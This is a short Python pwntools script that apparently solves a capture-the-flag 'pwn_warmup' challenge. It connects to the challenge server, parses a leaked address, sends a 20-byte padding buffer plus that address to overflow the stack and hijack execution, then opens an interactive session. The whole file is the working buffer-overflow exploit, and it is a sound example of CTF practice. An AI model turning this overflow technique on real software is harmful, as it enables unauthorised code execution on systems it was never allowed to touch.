from pwn import *

exe = ELF("warmup_pwn")

context.binary = exe


def conn():
        if False:
                return process([exe.path])
        else:
                return remote("pwn-warmup.chal.uiuc.tf", 1337)


def main():
        r = conn()
        r.recvuntil("This is pwn_warmup, go")
        data = r.read()
        data = data.decode("utf-8")
        data = data.split("=")
        memaddress = data[-1]
        memaddress = memaddress.strip()
        memaddress = int(memaddress ,16)
        r.sendline(b'A'*20 + p64(memaddress))
        r.interactive()


if __name__ == "__main__":
        main()
